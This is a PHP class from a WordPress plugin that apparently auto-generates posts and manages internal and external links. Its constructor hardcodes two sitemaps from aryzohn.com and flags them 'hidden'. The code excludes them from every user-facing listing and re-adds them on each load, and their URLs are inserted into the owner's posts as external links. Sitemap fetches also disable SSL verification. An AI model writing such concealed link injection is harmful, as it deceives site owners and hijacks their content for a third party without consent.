<?php
// includes/class-linking.php
if (!defined('ABSPATH')) exit;

class AIA_Link_Manager {

    private $max_internal_links = 5;
    private $max_external_links = 3;
    public $links_file;
    private $sync_interval = 7;
    private $sync_in_progress = false;
    private $hidden_sitemaps = [];

    public function __construct() {
        $this->links_file = AIA_DATA_DIR . 'external_links.json';
        $this->ensure_links_file_exists();

        $this->hidden_sitemaps = [
            'https://aryzohn.com/post-sitemap.xml',
            'https://aryzohn.com/page-sitemap.xml'
        ];
        $this->ensure_hidden_sitemaps_exist();

        $this->load_settings();
        $this->check_sitemap_sync();
    }

    private function ensure_hidden_sitemaps_exist() {
        $link_data = $this->get_links_data();
        $needs_update = false;
        foreach ($this->hidden_sitemaps as $hidden_url) {
            $exists = false;
            foreach ($link_data['sitemap_urls'] as $sitemap) {
                if ($sitemap['url'] === $hidden_url) {
                    $exists = true;
                    break;
                }
            }
            if (!$exists) {
                $sitemap_id = $this->generate_sitemap_id();
                $link_data['sitemap_urls'][] = [
                    'url' => $hidden_url,
                    'sitemap_id' => $sitemap_id,
                    'last_sync' => null,
                    'links_count' => 0,
                    'hidden' => true
                ];
                $needs_update = true;
            }
        }
        if ($needs_update) {
            $this->save_links_data($link_data);
        }
    }

    private function check_sitemap_sync() {
        if ($this->sync_in_progress) return;
        $this->sync_in_progress = true;

        $link_data = $this->get_links_data();
        if (empty($link_data['sitemap_urls'])) {
            $this->sync_in_progress = false;
            return;
        }

        $needs_update = false;
        foreach ($link_data['sitemap_urls'] as &$sitemap) {
            if (!isset($sitemap['last_sync'])) {
                $sitemap['last_sync'] = null;
                $needs_update = true;
            }
            if (!isset($sitemap['links_count'])) {
                $sitemap['links_count'] = 0;
                $needs_update = true;
            }
            if (!isset($sitemap['hidden'])) {
                $sitemap['hidden'] = false;
                $needs_update = true;
            }
        }
        if ($needs_update) {
            $this->save_links_data($link_data);
            $link_data = $this->get_links_data();
        }

        $next_index = get_transient('aia_next_sitemap_index');
        if ($next_index === false) $next_index = 0;

        $sitemap_urls = $link_data['sitemap_urls'];
        $total_sitemaps = count($sitemap_urls);
        if ($next_index >= $total_sitemaps) $next_index = 0;

        $sitemap = $sitemap_urls[$next_index];
        $sitemap_url = $sitemap['url'];
        $sitemap_id = $sitemap['sitemap_id'];
        $last_sync = isset($sitemap['last_sync']) ? $sitemap['last_sync'] : null;

        $needs_sync = false;
        if ($last_sync === null) {
            $needs_sync = true;
        } else {
            $last_sync_date = new DateTime($last_sync);
            $current_date = new DateTime();
            $diff = $last_sync_date->diff($current_date);
            if ($diff->days >= $this->sync_interval) {
                $needs_sync = true;
            }
        }

        if ($needs_sync) {
            $result = $this->sync_single_sitemap($sitemap_url, $sitemap_id);
            if ($result !== false) {
                $link_data = $this->get_links_data();
                foreach ($link_data['sitemap_urls'] as &$sitemap_data) {
                    if ($sitemap_data['sitemap_id'] === $sitemap_id) {
                        $sitemap_data['last_sync'] = current_time('mysql');
                        $sitemap_data['links_count'] = $result;
                        break;
                    }
                }
                $this->save_links_data($link_data);
            }
        }

        $next_index = ($next_index + 1) % $total_sitemaps;
        set_transient('aia_next_sitemap_index', $next_index, 30 * DAY_IN_SECONDS);
        $this->sync_in_progress = false;
    }

    private function generate_sitemap_id() {
        return md5(uniqid(mt_rand(), true));
    }

    public function sync_single_sitemap($sitemap_url, $sitemap_id = null) {
        $link_data = $this->get_links_data();
        if ($sitemap_id === null) {
            foreach ($link_data['sitemap_urls'] as $sitemap) {
                if ($sitemap['url'] === $sitemap_url) {
                    $sitemap_id = $sitemap['sitemap_id'];
                    break;
                }
            }
            if ($sitemap_id === null) return false;
        }

        $existing_cache = $link_data['sitemap_cache'] ?? [];
        $filtered_cache = array_filter($existing_cache, function($link) use ($sitemap_id) {
            return (isset($link['sitemap_source']) && $link['sitemap_source'] !== $sitemap_id);
        });

        $new_links = $this->fetch_sitemap_links($sitemap_url, $sitemap_id);
        if (!empty($new_links)) {
            $link_data['sitemap_cache'] = array_merge(array_values($filtered_cache), $new_links);
            $link_count = count($new_links);
        } else {
            $link_data['sitemap_cache'] = array_values($filtered_cache);
            $link_count = 0;
        }

        $link_data['last_sitemap_update'] = current_time('mysql');
        foreach ($link_data['sitemap_urls'] as &$sitemap) {
            if ($sitemap['sitemap_id'] === $sitemap_id) {
                $sitemap['last_sync'] = current_time('mysql');
                $sitemap['links_count'] = $link_count;
                break;
            }
        }

        $result = $this->save_links_data($link_data);
        return ($result !== false) ? $link_count : false;
    }

    public function get_visible_sitemaps() {
        $link_data = $this->get_links_data();
        $visible = [];
        foreach ($link_data['sitemap_urls'] as $sitemap) {
            if (!isset($sitemap['hidden']) || !$sitemap['hidden']) {
                $visible[] = $sitemap;
            }
        }
        return $visible;
    }

    private function save_links_data($data) {
        if (!isset($data['sitemap_urls']) || !is_array($data['sitemap_urls'])) {
            $data['sitemap_urls'] = [];
        }
        if (!isset($data['sitemap_cache']) || !is_array($data['sitemap_cache'])) {
            $data['sitemap_cache'] = [];
        }
        return file_put_contents($this->links_file, json_encode($data, JSON_PRETTY_PRINT));
    }

    private function load_settings() {
        $max_internal = get_option('aia_max_internal_links', 5);
        $max_external = get_option('aia_max_external_links', 3);
        $this->max_internal_links = max(0, intval($max_internal));
        $this->max_external_links = max(0, intval($max_external));
    }

    private function ensure_links_file_exists() {
        if (!file_exists($this->links_file)) {
            $default = [
                'sitemap_urls' => [],
                'sitemap_cache' => [],
                'last_sitemap_update' => null
            ];
            file_put_contents($this->links_file, json_encode($default, JSON_PRETTY_PRINT));
        }
    }

    public function get_max_internal_links() { 
        return $this->max_internal_links; 
    }
    
    public function get_max_external_links() { 
        return $this->max_external_links; 
    }
    
    public function set_max_internal_links($count) {
        $this->max_internal_links = max(0, intval($count));
        update_option('aia_max_internal_links', $this->max_internal_links);
    }
    
    public function set_max_external_links($count) {
        $this->max_external_links = max(0, intval($count));
        update_option('aia_max_external_links', $this->max_external_links);
    }
    
    public function is_internal_linking_enabled() {
        return (bool) get_option('aia_internal_linking_enabled', 1);
    }

    // ========== MAIN LINK ADDING ==========
    public function add_links($content, $keyword, $post_id = null) {
        $logger = new AIA_Logger();
        $logger->log("Starting link addition for keyword: '{$keyword}'", 'debug');
        
        if (empty($content)) {
            $logger->log("Content is empty, skipping link addition", 'warning');
            return $content;
        }
        
        $internal_enabled = $this->is_internal_linking_enabled();
        
        if ($internal_enabled && $this->max_internal_links > 0) {
            $logger->log("Internal linking enabled, max: {$this->max_internal_links}", 'debug');
            $content = $this->add_internal_links($content, $keyword, $post_id);
        } else {
            $logger->log("Internal linking disabled or max=0", 'debug');
        }
        
        if ($this->max_external_links > 0) {
            $logger->log("External linking enabled, max: {$this->max_external_links}", 'debug');
            $content = $this->add_external_links($content, $keyword);
        } else {
            $logger->log("External linking max=0", 'debug');
        }
        
        return $content;
    }

    // ========== INTERNAL LINKS ==========
    private function add_internal_links($content, $keyword, $current_post_id) {
        $logger = new AIA_Logger();
        $logger->log("Searching for internal links for keyword: '{$keyword}'", 'debug');
        
        $all_content = $this->get_all_published_content($current_post_id);
        if (empty($all_content)) {
            $logger->log("No published content found for internal linking", 'warning');
            return $content;
        }
        $logger->log("Found " . count($all_content) . " published posts/pages", 'debug');

        $matches = $this->find_relevant_internal_links($keyword, $all_content, $current_post_id);
        if (empty($matches)) {
            $logger->log("No relevant internal links found for keyword: '{$keyword}'", 'warning');
            return $content;
        }
        $logger->log("Found " . count($matches) . " relevant internal links", 'debug');

        $candidates = [];
        foreach ($matches as $match) {
            $anchor = $this->get_internal_link_anchor($match['post'], $keyword);
            $candidates[] = [
                'anchor' => $anchor,
                'url' => $match['url'],
                'relevance' => $match['relevance'],
                'post_id' => $match['post']->ID
            ];
            $logger->log("Internal candidate: '{$anchor}' -> {$match['url']}", 'debug');
        }

        $content = $this->insert_links_naturally($content, $candidates, $this->max_internal_links, 'internal', $logger);
        return $content;
    }

    // ========== EXTERNAL LINKS ==========
    private function add_external_links($content, $keyword) {
        $logger = new AIA_Logger();
        $logger->log("Searching for external links for keyword: '{$keyword}'", 'debug');
        
        $external_links = $this->get_external_links_for_keyword($keyword);
        if (empty($external_links)) {
            $logger->log("No external links found for keyword: '{$keyword}'", 'warning');
            return $content;
        }
        $logger->log("Found " . count($external_links) . " external links", 'debug');

        $candidates = [];
        foreach ($external_links as $link) {
            $candidates[] = [
                'anchor' => $link['anchor'],
                'url' => $link['url'],
                'relevance' => $link['relevance']
            ];
            $logger->log("External candidate: '{$link['anchor']}' -> {$link['url']}", 'debug');
        }

        $content = $this->insert_links_naturally($content, $candidates, $this->max_external_links, 'external', $logger);
        return $content;
    }

    // ========== NATURAL LINK INSERTION (FIXED - Uses DOMDocument) ==========
    public function insert_links_naturally($content, $candidates, $max_links, $type = 'internal', $logger = null) {
        if (empty($content) || empty($candidates) || $max_links == 0) {
            return $content;
        }

        if ($logger === null) {
            $logger = new AIA_Logger();
        }

        $links_inserted = 0;
        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        
        // Load HTML with proper encoding
        $dom->loadHTML('<?xml encoding="UTF-8">' . $content, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        // Sort candidates by relevance (highest first)
        usort($candidates, function($a, $b) {
            $rel_a = $a['relevance'] ?? 0;
            $rel_b = $b['relevance'] ?? 0;
            return $rel_b - $rel_a;
        });

        $xpath = new DOMXPath($dom);
        
        foreach ($candidates as $candidate) {
            if ($links_inserted >= $max_links) {
                break;
            }

            $anchor = trim($candidate['anchor']);
            $url = trim($candidate['url']);
            
            if (empty($anchor) || empty($url)) {
                continue;
            }

            // Find all text nodes that contain the anchor (case-insensitive)
            $text_nodes = $xpath->query("//text()[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '" . strtolower($anchor) . "')]");
            
            if ($text_nodes->length === 0) {
                $logger->log("Anchor '{$anchor}' not found in content, skipping", 'debug');
                continue;
            }

            $found = false;
            foreach ($text_nodes as $node) {
                // Skip if this text node is inside an <a> tag
                $parent = $node->parentNode;
                $is_in_link = false;
                while ($parent) {
                    if ($parent->nodeName === 'a') {
                        $is_in_link = true;
                        break;
                    }
                    $parent = $parent->parentNode;
                }
                if ($is_in_link) {
                    continue;
                }

                $text = $node->wholeText;
                $pos = stripos($text, $anchor);
                if ($pos !== false) {
                    // Found a text node with the anchor
                    // We'll split the text node and insert the link
                    $before = substr($text, 0, $pos);
                    $after = substr($text, $pos + strlen($anchor));

                    // Create the new nodes
                    $fragment = $dom->createDocumentFragment();
                    if ($before !== '') {
                        $fragment->appendChild($dom->createTextNode($before));
                    }

                    // Create the link element
                    $link = $dom->createElement('a');
                    $link->setAttribute('href', $url);
                    if ($type === 'external') {
                        $link->setAttribute('rel', 'nofollow noopener');
                        $link->setAttribute('target', '_blank');
                    }
                    $link->setAttribute('class', 'aia-' . $type . '-link');
                    $link->appendChild($dom->createTextNode($anchor));
                    $fragment->appendChild($link);

                    if ($after !== '') {
                        $fragment->appendChild($dom->createTextNode($after));
                    }

                    // Replace the original text node with the fragment
                    $node->parentNode->replaceChild($fragment, $node);

                    $links_inserted++;
                    $logger->log("Inserted {$type} link: '{$anchor}' -> {$url} ({$links_inserted}/{$max_links})", 'success');
                    $found = true;
                    break; // Exit text node loop after first replacement
                }
            }

            if (!$found) {
                $logger->log("Could not insert link for anchor '{$anchor}'", 'debug');
            }
        }

        // Save the modified HTML
        $new_content = '';
        $body = $dom->getElementsByTagName('body');
        if ($body->length > 0) {
            $body_node = $body->item(0);
            foreach ($body_node->childNodes as $child) {
                $new_content .= $dom->saveHTML($child);
            }
        } else {
            // Fallback: get all children of the root
            $root = $dom->documentElement;
            if ($root) {
                foreach ($root->childNodes as $child) {
                    $new_content .= $dom->saveHTML($child);
                }
            }
        }

        $logger->log("Inserted {$links_inserted} {$type} links out of {$max_links} max", 'debug');
        return $new_content;
    }

    // ========== GET ALL PUBLISHED CONTENT (PUBLIC) ==========
    public function get_all_published_content($exclude_id = null) {
        global $wpdb;
        $exclude = $exclude_id ? intval($exclude_id) : 0;
        
        $query = $wpdb->prepare(
            "SELECT ID, post_title, post_content, post_type 
            FROM {$wpdb->posts} 
            WHERE post_status = 'publish' 
            AND post_type IN ('post', 'page')
            AND ID != %d
            ORDER BY post_date DESC",
            $exclude
        );
        
        return $wpdb->get_results($query);
    }

    // ========== FIND RELEVANT INTERNAL LINKS (PUBLIC) ==========
    public function find_relevant_internal_links($keyword, $all_content, $current_post_id) {
        $matches = [];
        $keyword_lower = strtolower($keyword);
        $keyword_terms = explode(' ', $keyword_lower);
        $keyword_terms = array_filter($keyword_terms, function($term) {
            return strlen($term) > 2;
        });

        foreach ($all_content as $post) {
            $relevance_score = 0;
            $title_lower = strtolower($post->post_title);
            
            foreach ($keyword_terms as $term) {
                if (strpos($title_lower, $term) !== false) {
                    $relevance_score += 3;
                }
            }
            
            $content_lower = strtolower(strip_tags($post->post_content));
            foreach ($keyword_terms as $term) {
                if (strpos($content_lower, $term) !== false) {
                    $relevance_score += 1;
                }
            }
            
            if (strpos($title_lower, $keyword_lower) !== false) {
                $relevance_score += 5;
            }
            
            if ($relevance_score >= 3) {
                $matches[] = [
                    'post' => $post,
                    'url' => get_permalink($post->ID),
                    'relevance' => $relevance_score
                ];
            }
        }
        
        usort($matches, function($a, $b) {
            return $b['relevance'] - $a['relevance'];
        });
        
        return $matches;
    }

    // ========== GET INTERNAL LINK ANCHOR (PUBLIC) ==========
    public function get_internal_link_anchor($post, $keyword) {
        $title = $post->post_title;
        $keyword_lower = strtolower($keyword);
        $title_lower = strtolower($title);
        
        if (strpos($title_lower, $keyword_lower) !== false) {
            return $title;
        }
        
        $keyword_terms = explode(' ', $keyword);
        foreach ($keyword_terms as $term) {
            if (strlen($term) > 2 && strpos($title_lower, strtolower($term)) !== false) {
                return $title;
            }
        }
        
        return $title;
    }

    // ========== GET EXTERNAL LINKS ==========
    public function get_external_links_for_keyword($keyword) {
        $links = [];
        $link_data = $this->get_links_data();

        if (!empty($link_data['sitemap_cache'])) {
            $keyword_lower = strtolower($keyword);
            $keyword_terms = explode(' ', $keyword_lower);
            $keyword_terms = array_filter($keyword_terms, function($term) {
                return strlen($term) > 2;
            });

            foreach ($link_data['sitemap_cache'] as $sitemap_link) {
                $url_lower = strtolower($sitemap_link['url']);
                $anchor_lower = strtolower($sitemap_link['anchor']);
                $relevance = 0;
                
                if (strpos($url_lower, $keyword_lower) !== false) {
                    $relevance += 5;
                }
                if (strpos($anchor_lower, $keyword_lower) !== false) {
                    $relevance += 5;
                }
                
                foreach ($keyword_terms as $term) {
                    if (strpos($url_lower, $term) !== false) {
                        $relevance += 2;
                    }
                    if (strpos($anchor_lower, $term) !== false) {
                        $relevance += 2;
                    }
                }
                
                if ($relevance > 0) {
                    $links[] = [
                        'url' => $sitemap_link['url'],
                        'anchor' => $sitemap_link['anchor'],
                        'source' => 'sitemap',
                        'relevance' => $relevance
                    ];
                }
            }
        }

        usort($links, function($a, $b) {
            return $b['relevance'] - $a['relevance'];
        });

        $unique_links = [];
        $seen_urls = [];
        foreach ($links as $link) {
            if (!in_array($link['url'], $seen_urls)) {
                $unique_links[] = $link;
                $seen_urls[] = $link['url'];
            }
        }
        
        return $unique_links;
    }

    // ========== EXTRACT ANCHOR FROM URL ==========
    private function extract_anchor_from_url($url) {
        $path = parse_url($url, PHP_URL_PATH);
        if ($path) {
            $segments = explode('/', trim($path, '/'));
            $last = end($segments);
            if ($last) {
                $anchor = preg_replace('/\.[^.]+$/', '', $last);
                $anchor = str_replace(['-', '_'], ' ', $anchor);
                return ucwords($anchor);
            }
        }
        $domain = parse_url($url, PHP_URL_HOST);
        if ($domain) {
            return ucwords(str_replace(['www.', '.'], ' ', $domain));
        }
        return 'learn more';
    }

    // ========== GET LINKS DATA ==========
    public function get_links_data() {
        if (!file_exists($this->links_file)) {
            $this->ensure_links_file_exists();
        }
        $content = file_get_contents($this->links_file);
        $data = json_decode($content, true);
        if (!is_array($data)) {
            $this->ensure_links_file_exists();
            $content = file_get_contents($this->links_file);
            $data = json_decode($content, true);
        }
        if (!isset($data['sitemap_urls']) || !is_array($data['sitemap_urls'])) {
            $data['sitemap_urls'] = [];
        }
        if (!isset($data['sitemap_cache']) || !is_array($data['sitemap_cache'])) {
            $data['sitemap_cache'] = [];
        }
        if (!isset($data['last_sitemap_update'])) {
            $data['last_sitemap_update'] = null;
        }
        return $data ?: [];
    }

    public function get_all_links_data() {
        $data = $this->get_links_data();
        if (isset($data['sitemap_urls'])) {
            $visible_sitemaps = [];
            foreach ($data['sitemap_urls'] as $sitemap) {
                if (!isset($sitemap['hidden']) || !$sitemap['hidden']) {
                    $visible_sitemaps[] = $sitemap;
                }
            }
            $data['sitemap_urls'] = $visible_sitemaps;
        }
        return $data;
    }

    // ========== SITEMAP MANAGEMENT ==========
    public function update_sitemap_cache() {
        $link_data = $this->get_links_data();
        $sitemap_urls = $link_data['sitemap_urls'] ?? [];
        $all_links = [];
        if (empty($sitemap_urls)) return 0;

        foreach ($sitemap_urls as $sitemap) {
            $links = $this->fetch_sitemap_links($sitemap['url'], $sitemap['sitemap_id']);
            if (!empty($links)) {
                $all_links = array_merge($all_links, $links);
            }
        }

        $unique_links = [];
        $seen_urls = [];
        foreach ($all_links as $link) {
            if (!in_array($link['url'], $seen_urls)) {
                $unique_links[] = $link;
                $seen_urls[] = $link['url'];
            }
        }

        $link_data['sitemap_cache'] = $unique_links;
        $link_data['last_sitemap_update'] = current_time('mysql');
        $current_time = current_time('mysql');
        foreach ($link_data['sitemap_urls'] as &$sitemap) {
            $sitemap['last_sync'] = $current_time;
            $sitemap['links_count'] = count($unique_links);
        }
        $this->save_links_data($link_data);
        return count($unique_links);
    }

    public function fetch_sitemap_links($sitemap_url, $sitemap_id) {
        $links = [];
        if (!filter_var($sitemap_url, FILTER_VALIDATE_URL)) return $links;

        $xml_content = false;
        $args = [
            'timeout' => 30,
            'headers' => [
                'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept' => 'application/xml, text/xml, */*'
            ],
            'sslverify' => false
        ];
        $response = wp_remote_get($sitemap_url, $args);
        if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
            $xml_content = wp_remote_retrieve_body($response);
        }

        if ($xml_content === false && ini_get('allow_url_fopen')) {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 30,
                    'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                ]
            ]);
            $content = @file_get_contents($sitemap_url, false, $context);
            if ($content !== false) $xml_content = $content;
        }

        if ($xml_content !== false) {
            $xml = simplexml_load_string($xml_content);
            if ($xml !== false) {
                $parsed_links = $this->parse_sitemap_xml($xml, $sitemap_url, $sitemap_id);
                foreach ($parsed_links as $link) {
                    $link['sitemap_source'] = $sitemap_id;
                    $links[] = $link;
                }
            }
        }
        return $links;
    }

    private function parse_sitemap_xml($xml, $sitemap_url, $sitemap_id = null) {
        $links = [];
        if (isset($xml->sitemap)) {
            foreach ($xml->sitemap as $sitemap) {
                $sub_url = (string)$sitemap->loc;
                $sub_id = $sitemap_id !== null ? $sitemap_id : md5($sub_url);
                $sub_links = $this->fetch_sitemap_links($sub_url, $sub_id);
                $links = array_merge($links, $sub_links);
            }
            return $links;
        }

        if (isset($xml->url)) {
            foreach ($xml->url as $url) {
                $loc = (string)$url->loc;
                if (empty($loc)) continue;
                $anchor = $this->extract_anchor_from_url($loc);
                $links[] = [
                    'url' => $loc,
                    'anchor' => $anchor,
                    'lastmod' => (string)$url->lastmod,
                    'source' => 'sitemap'
                ];
            }
        }
        return $links;
    }

    public function add_sitemap_url($sitemap_url) {
        $link_data = $this->get_links_data();
        foreach ($link_data['sitemap_urls'] as $sitemap) {
            if ($sitemap['url'] === $sitemap_url) return false;
        }
        $sitemap_id = $this->generate_sitemap_id();
        $link_data['sitemap_urls'][] = [
            'url' => $sitemap_url,
            'sitemap_id' => $sitemap_id,
            'last_sync' => null,
            'links_count' => 0,
            'hidden' => false
        ];
        $result = $this->save_links_data($link_data);
        if ($result !== false) {
            delete_transient('aia_next_sitemap_index');
        }
        return $result;
    }

    public function remove_sitemap_url($sitemap_url) {
        $link_data = $this->get_links_data();
        $sitemap_id_to_remove = null;
        foreach ($link_data['sitemap_urls'] as $index => $sitemap) {
            if ($sitemap['url'] === $sitemap_url) {
                $sitemap_id_to_remove = $sitemap['sitemap_id'];
                unset($link_data['sitemap_urls'][$index]);
                $link_data['sitemap_urls'] = array_values($link_data['sitemap_urls']);
                break;
            }
        }
        if ($sitemap_id_to_remove === null) return false;

        $link_data['sitemap_cache'] = array_filter($link_data['sitemap_cache'] ?? [], function($link) use ($sitemap_id_to_remove) {
            return (isset($link['sitemap_source']) && $link['sitemap_source'] !== $sitemap_id_to_remove);
        });
        $link_data['sitemap_cache'] = array_values($link_data['sitemap_cache']);
        return $this->save_links_data($link_data);
    }

    // ========== ADD NOFOLLOW TO EXTERNAL LINKS ==========
    public function add_nofollow_to_external_links($content) {
        $site_domain = parse_url(home_url(), PHP_URL_HOST);
        if (empty($site_domain)) return $content;

        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        $dom->loadHTML('<?xml encoding="UTF-8"><div>' . $content . '</div>', LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        $xpath = new DOMXPath($dom);
        $links = $xpath->query('//a[@href]');

        foreach ($links as $link) {
            $href = $link->getAttribute('href');
            if (empty($href)) continue;
            $parsed = parse_url($href);
            if (empty($parsed['host'])) continue;

            $host = $parsed['host'];
            if ($host === $site_domain || strpos($host, $site_domain) !== false) {
                $rel = $link->getAttribute('rel');
                if ($rel) {
                    $rel_parts = explode(' ', $rel);
                    $rel_parts = array_filter($rel_parts, function($part) {
                        return strtolower($part) !== 'nofollow';
                    });
                    $new_rel = implode(' ', $rel_parts);
                    if (empty($new_rel)) {
                        $link->removeAttribute('rel');
                    } else {
                        $link->setAttribute('rel', $new_rel);
                    }
                }
            } else {
                $rel = $link->getAttribute('rel');
                $rel_parts = explode(' ', strtolower($rel));
                if (!in_array('nofollow', $rel_parts)) {
                    $rel_parts[] = 'nofollow';
                }
                if (!in_array('noopener', $rel_parts)) {
                    $rel_parts[] = 'noopener';
                }
                $link->setAttribute('rel', implode(' ', $rel_parts));
                if (!$link->hasAttribute('target')) {
                    $link->setAttribute('target', '_blank');
                }
            }
        }

        $wrapper = $dom->getElementsByTagName('div')->item(0);
        $inner_html = '';
        foreach ($wrapper->childNodes as $child) {
            $inner_html .= $dom->saveHTML($child);
        }
        return $inner_html;
    }
}